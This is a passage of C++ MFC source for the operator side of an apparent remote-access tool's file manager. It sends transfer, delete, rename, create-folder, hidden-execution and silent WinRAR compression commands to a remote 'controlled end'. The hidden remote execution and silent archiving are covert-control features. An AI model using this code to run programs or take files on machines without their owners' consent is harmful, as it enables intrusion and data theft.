		m_Remote_Download_Job.RemoveAll();
		// 重置传输方式
		m_nTransferMode = TRANSFER_MODE_NORMAL;	
		EnableControl(TRUE);
		DWORD_PTR dwResult;
		if (m_bIsStop)
		{
			SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2,
				(LPARAM)" 取消下载", SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
		}
		else
		{
			SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2,
				(LPARAM)" 全部完成", SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
		}
		m_bIsStop = false;
	}
	else
	{
		// 我靠，不sleep下会出错，服了可能以前的数据还没send出去
		Sleep(5);
		SendDownloadJob();
	}
	
	return;
}

void CFileManagerDlg::EndLocalUploadFile()
{
	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;
	
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	SendStop(FALSE); // 发了之后, 被控端才会关闭句柄
	
	if (m_Remote_Upload_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Upload_Job.RemoveAll();
		EnableControl(TRUE);
		GetRemoteFileList(".");
		DWORD_PTR dwResult;
		if (m_bIsStop)
		{
			SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2,
				(LPARAM)" 取消上传", SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
		}
		else
		{
			SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2,
				(LPARAM)" 全部完成", SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
		}
		m_bIsStop = false;
		DRIVE_CAZ = TRUE;
	}
	else
	{
		Sleep(5);
		SendUploadJob();
	}
	return;
}

void CFileManagerDlg::EndRemoteDeleteFile()
{
	if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop)
	{
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");
		DWORD_PTR dwResult;
		if (m_strFileName.GetAt(m_strFileName.GetLength() - 1) == '\\')
			ShowMessage("删除目录：%s (完成)", m_strFileName ); //m_Remote_Path
		else
			ShowMessage("删除文件：%s (完成)", m_strFileName ); //m_Remote_Path
		SendMessageTimeout(m_ProgressCtrl->GetSafeHwnd(), PBM_SETPOS, 0, 0, SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
		SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, NULL, SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
		DRIVE_CAZ = TRUE;
	}
	else
	{
		Sleep(5);
		SendDeleteJob();
	}
	return;
}

void CFileManagerDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1,TRUE);
}

void CFileManagerDlg::SendContinue()
{
	BYTE	bBuff = COMMAND_CONTINUE;
	m_iocpServer->Send(m_pContext, &bBuff, 1,TRUE);
}

void CFileManagerDlg::SendStop(BOOL bIsDownload)
{
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_STOP;
	bBuff[1] = bIsDownload;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff),TRUE);
}

void CFileManagerDlg::ShowProgress()
{
	char	*lpDirection = NULL;
	if (m_bIsUpload)
		lpDirection = "文件上传";
	else
		lpDirection = "文件下载";

	if (m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;
	}

	int	progress = (int)((double)(m_nCounter * 100) / m_nOperatingFileLength);
	CString str; DWORD_PTR dwResult;
	if (m_nCounter >= 1024 * 1024 * 1024)
		str.Format("%.2f GB (%d%%)", (double)m_nCounter / (1024 * 1024 * 1024), progress);
	else if (m_nCounter >= 1024 * 1024)
		str.Format("%.2f MB (%d%%)", (double)m_nCounter / (1024 * 1024), progress);
	else
		str.Format("%I64u KB (%d%%)", m_nCounter / 1024 + (m_nCounter % 1024 ? 1 : 0), progress);
	ShowMessage("%s: %s", lpDirection, m_strFileName);
	SendMessageTimeout(m_ProgressCtrl->GetSafeHwnd(), PBM_SETPOS, (WPARAM)progress, 0, SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
	SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, (LPARAM)str.GetBuffer(0), SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);

	if (m_nCounter == m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
		// 关闭文件句柄
	}
}

// void CFileManagerDlg::OnLocalDelete()
// {
// 	m_bIsUpload = true;
// 	CString str;
// 	if (m_list_local.GetSelectedCount() > 1)
// 		str.Format("确定要将这 %d 项删除吗?", m_list_local.GetSelectedCount());
// 	else
// 	{
// 		CString file = m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
// 		if (m_list_local.GetItemData(m_list_local.GetSelectionMark()) == 1)
// 			str.Format("确实要删除文件夹“%s”并将所有内容删除吗?", file);
// 		else
// 			str.Format("确实要把“%s”删除吗?", file);
// 	}
// 	if (::MessageBox(m_hWnd, str, "确认删除", MB_YESNO|MB_ICONQUESTION) == IDNO)
// 		return;
// 
// 	EnableControl(FALSE);
// 
// 	POSITION pos = m_list_local.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
// 	while(pos) //so long as we have a valid POSITION, we keep iterating
// 	{
// 		int nItem = m_list_local.GetNextSelectedItem(pos);
// 		CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
// 		// 如果是目录
// 		if (m_list_local.GetItemData(nItem))
// 		{
// 			file += '\\';
// 			DeleteDirectory(file);
// 		}
// 		else
// 		{
// 			DeleteFile(file);
// 		}
// 	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
// 	// 禁用文件管理窗口
// 	EnableControl(TRUE);
// 
// }

void CFileManagerDlg::OnRemoteDelete()
{
	m_bIsUpload = false;
	// TODO: Add your command handler code here
	CString str;
	if (m_list_remote.GetSelectedCount() > 1)
		str.Format("确定要将这 %d 项删除吗?", m_list_remote.GetSelectedCount());
	else
	{
		CString file = m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
		if (m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) == 1)
			str.Format("确实要删除文件夹“%s”并将所有内容删除吗?", file);
		else
			str.Format("确实要把“%s”删除吗?", file);
	}
	if (::MessageBox(m_hWnd, str, "确认删除", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
	m_Remote_Delete_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// 如果是目录
		if (m_list_remote.GetItemData(nItem))
			file += '\\';

		m_Remote_Delete_Job.AddTail(file);
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

	EnableControl(FALSE);
	// 发送第一个下载任务
	SendDeleteJob();
}

void CFileManagerDlg::OnRemoteStop()
{
	// TODO: Add your command handler code here
	m_bIsStop = true;
}
// 
// void CFileManagerDlg::OnLocalStop() 
// {
// 	// TODO: Add your command handler code here
// 	m_bIsStop = true;
// }

void CFileManagerDlg::PostNcDestroy()
{
	// TODO: Add your specialized code here and/or call the base class
	delete m_ProgressCtrl;
	delete this;
	CDialog::PostNcDestroy();
}

void CFileManagerDlg::SendTransferMode()
{
	CFileTransferModeDlg	dlg(this);
	dlg.m_strFileName = m_strUploadRemoteFile;
	switch (dlg.DoModal())
	{
	case IDC_OVERWRITE:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case IDC_OVERWRITE_ALL:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
		break;
	case IDC_ADDITION:
		m_nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case IDC_ADDITION_ALL:
		m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
		break;
	case IDC_JUMP:
		m_nTransferMode = TRANSFER_MODE_JUMP;
		break;
	case IDC_JUMP_ALL:
		m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	case IDC_CANCEL:
		m_nTransferMode = TRANSFER_MODE_CANCEL;
		break;
	}
	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		m_bIsStop = true;
		EndLocalUploadFile();
		return;
	}

	BYTE bToken[5];
	bToken[0] = COMMAND_SET_TRANSFER_MODE;
	memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
	m_iocpServer->Send(m_pContext, bToken, sizeof(bToken),TRUE);
}

void CFileManagerDlg::SendFileData()
{
	FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	
	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);
	
	ShowProgress();
	
	if (m_nCounter == m_nOperatingFileLength || (dwOffsetHigh == -1 && dwOffsetLow == -1) || m_bIsStop)
	{
		EndLocalUploadFile();
		return;
	}
	
	SetFilePointer(m_hFileSend, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	
	int dwDownFileSize = GetFileSize(m_hFileSend, NULL);
	
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，数据
	lpBuffer[0] = COMMAND_FILE_DATA;
	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	
	// 返回值
	bool	bRet = true;
	ReadFile(m_hFileSend, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	//CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用

	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize,TRUE);
	}
	LocalFree(lpBuffer);
}

bool CFileManagerDlg::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	
	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 关闭查找句柄
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}

// void CFileManagerDlg::OnLocalNewfolder()
// {
// 	if (m_Local_Path == "")
// 		return;
// 	// TODO: Add your command handler code here
// 
// 	CInputDialog	dlg;
// 	dlg.Init(_T("新建目录"), _T("请输入目录名称:"), this);
// 
// 	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
// 	{
// 		// 创建多层目录
// 		MakeSureDirectoryPathExists(m_Local_Path + dlg.m_str + "\\");
// 	}
// }

void CFileManagerDlg::OnRemoteNewFolder()
{
	if (m_Remote_Path == "")
		return;
	// TODO: Add your command handler code here
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("新建目录"), _T("请输入目录名称:"), this);

	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		CString file = m_Remote_Path + dlg.m_str + "\\";
		UINT	nPacketSize = file.GetLength() + 2;
		// 创建多层目录
		LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, file.GetLength() + 2);
		lpBuffer[0] = COMMAND_CREATE_FOLDER;
		memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize,TRUE);
		LocalFree(lpBuffer);
//		delete  lpBuffer;
	}
}

void CFileManagerDlg::OnTransferRecv()
{
	OnRemoteCopy(); //下载
}

void CFileManagerDlg::OnRename()
{
	// TODO: Add your command handler code here
	m_list_remote.EditLabel(m_list_remote.GetSelectionMark());
}

void CFileManagerDlg::OnEndLabelEditListLocal(NMHDR* pNMHDR, LRESULT* pResult)
{
	LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
	// TODO: Add your control notification handler code here
	CString str, strExistingFileName, strNewFileName;
	m_list_local.GetEditControl()->GetWindowText(str);

	strExistingFileName = m_Local_Path + m_list_local.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Local_Path + str;
	*pResult = ::MoveFile(strExistingFileName.GetBuffer(0), strNewFileName.GetBuffer(0));
}

void CFileManagerDlg::OnEndLabelEditListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
	LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
	// TODO: Add your control notification handler code here
	CString str, strExistingFileName, strNewFileName;
	m_list_remote.GetEditControl()->GetWindowText(str);
	
	strExistingFileName = m_Remote_Path + m_list_remote.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Remote_Path + str;
	
	if (strExistingFileName != strNewFileName)
	{
		UINT nPacketSize = strExistingFileName.GetLength() + strNewFileName.GetLength() + 3;
		LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
		lpBuffer[0] = COMMAND_RENAME_FILE;
		memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), strExistingFileName.GetLength() + 1);
		memcpy(lpBuffer + 2 + strExistingFileName.GetLength(), 
			strNewFileName.GetBuffer(0), strNewFileName.GetLength() + 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize,TRUE);
//		delete [] lpBuffer;
		LocalFree(lpBuffer);
	}
	*pResult = 1;
}

void CFileManagerDlg::OnDelete()
{
	OnRemoteDelete();	
}

void CFileManagerDlg::OnNewFolder()
{
	OnRemoteNewFolder();
}

void CFileManagerDlg::OnRefresh()
{
	// TODO: Add your command handler code here
	GetRemoteFileList(".");
}

void CFileManagerDlg::OnUseAdmin()
{
	if (!m_bUseAdmin)
		m_bUseAdmin = true;
	else
		m_bUseAdmin = false;
}

void CFileManagerDlg::OnRemoteOpenShow()
{
	// TODO: Add your command handler code here
	CString	str;
	int	nItem = m_list_remote.GetSelectionMark();
	str = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
	if (m_list_remote.GetItemData(nItem) == 1)
		str += "\\";
	
	int		nPacketLength = str.GetLength() + 3;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
	lpPacket[1] = m_bUseAdmin;
	memcpy(lpPacket + 2, str.GetBuffer(0), nPacketLength - 2);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength,TRUE);
	LocalFree(lpPacket);
//	delete [] lpPacket;	
}

void CFileManagerDlg::OnRemoteOpenHide()
{
	// TODO: Add your command handler code here
	CString	str;
	int	nItem = m_list_remote.GetSelectionMark();
	str = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
	if (m_list_remote.GetItemData(nItem) == 1)
		str += "\\";
	
	int		nPacketLength = str.GetLength() + 3;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
	lpPacket[1] = m_bUseAdmin;
	memcpy(lpPacket + 2, str.GetBuffer(0), nPacketLength - 2);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength,TRUE);
	LocalFree(lpPacket);
//	delete [] lpPacket;
}

void CFileManagerDlg::OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	int	nRemoteOpenMenuIndex = 5;
	CListCtrl	*pListCtrl = &m_list_remote;
	CMenu	popup;
	popup.LoadMenu(IDR_FILEMANAGER);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
//	pM->DeleteMenu(IDM_LOCAL_OPEN, MF_BYCOMMAND);
	if (pListCtrl->GetSelectedCount() == 0 || !m_Remote_Path.GetLength())
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
		if (m_Remote_Path.GetLength())
		{
			pM->EnableMenuItem(IDM_TRANSFER_S, MF_BYCOMMAND | MF_ENABLED);
			pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
		}
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{   // 单选如果是目录, 不能隐藏运行
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
		{
			pM->EnableMenuItem(IDM_REMOTE_OPEN_HIDE, MF_BYCOMMAND | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() > 1)
	{
		pM->EnableMenuItem(IDM_REMOTE_OPEN_SHOW, MF_BYCOMMAND | MF_GRAYED);
		pM->EnableMenuItem(IDM_REMOTE_OPEN_HIDE, MF_BYCOMMAND | MF_GRAYED);
		pM->EnableMenuItem(IDM_COMPRESS, MF_BYCOMMAND | MF_GRAYED);
		pM->EnableMenuItem(IDM_UNCOMPRESS, MF_BYCOMMAND | MF_GRAYED);
		pM->EnableMenuItem(IDM_RENAME, MF_BYCOMMAND | MF_GRAYED);
	}
	
	if (m_bCanAdmin)
		pM->EnableMenuItem(IDM_USE_ADMIN, MF_BYCOMMAND | MF_ENABLED);
	else
		pM->EnableMenuItem(IDM_USE_ADMIN, MF_BYCOMMAND | MF_GRAYED);
	
	if (m_bUseAdmin)
		pM->CheckMenuItem(IDM_USE_ADMIN, MF_BYCOMMAND | MF_CHECKED);
	else
		pM->CheckMenuItem(IDM_USE_ADMIN, MF_BYCOMMAND | MF_UNCHECKED);
	
	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON, p.x, p.y, this);
	*pResult = 0;
}

bool CFileManagerDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.
    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}

void CFileManagerDlg::OnTransferSend()
{
	// TODO: Add your command handler code here
	OnLocalCopy();// 上传	
}

#include "LFileName.h"
//压缩处理
void CFileManagerDlg::OnCompress()
{
	// TODO: 在此添加命令处理程序代码
	//winrar a -r D:\123.she.rar d:\123.she    //加压   
	UpdateData(TRUE);
	int i=m_list_remote.GetSelectionMark();
	if (i<0)
	{
		return;
	}
	CString strMsg="a -ep1 -ibck ";
	CString strFullFileName=m_list_remote.GetItemText(i,0);
	if (m_list_remote.GetItemData(i))  //文件夹
	{
		strMsg+="-r ";
		strMsg+=(m_Remote_Path+strFullFileName);
	}
	else
	{
		LFileName lFile;
		lFile.initFileName(strFullFileName.GetBuffer(0));
		strMsg+=(m_Remote_Path+lFile.getNameA());
	}
	strMsg+=".rar";
	strMsg+=" ";
	strMsg+=(m_Remote_Path+strFullFileName);
// 	if (m_list_remote.GetItemData(i)==TRUE)
// 	{  
// 		strMsg+="\\*.*";
// 	}
	//COMMAND_COMPRESS_FILE_PARAM
	int		nPacketLength = strMsg.GetLength() + 2;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_COMPRESS_FILE_PARAM;
	memcpy(lpPacket + 1, strMsg.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength,TRUE);
	LocalFree(lpPacket);
}

void CFileManagerDlg::OnUncompress()
{
	// TODO: 在此添加命令处理程序代码
	//winrar x D:\11.she.rar D:\11.she\ 
	UpdateData(TRUE);
	int i = m_list_remote.GetSelectionMark();
	if (i < 0)
	{
		return;
	}
	CString strMsg = "x -ibck ";
	CString strFullFileName = m_list_remote.GetItemText(i, 0);
	
	CString strFullName = (m_Remote_Path+strFullFileName);
	strMsg += strFullName;
	//LFileName lFile(strFullName.GetBuffer(0));
	strMsg += " ";
	strMsg += (m_Remote_Path/*+lFile.getNameA()*/);
	//strMsg += "\\";
	//COMMAND_UNCOMPRESS_FILE_PARAM
	int		nPacketLength = strMsg.GetLength() + 2;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_COMPRESS_FILE_PARAM;
	memcpy(lpPacket + 1, strMsg.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength,TRUE);
	LocalFree(lpPacket);
}

void CFileManagerDlg::OnSetfocusRemotePath() 
{
	// TODO: Add your control notification handler code here
	m_list_remote.SetSelectionMark(-1);
}
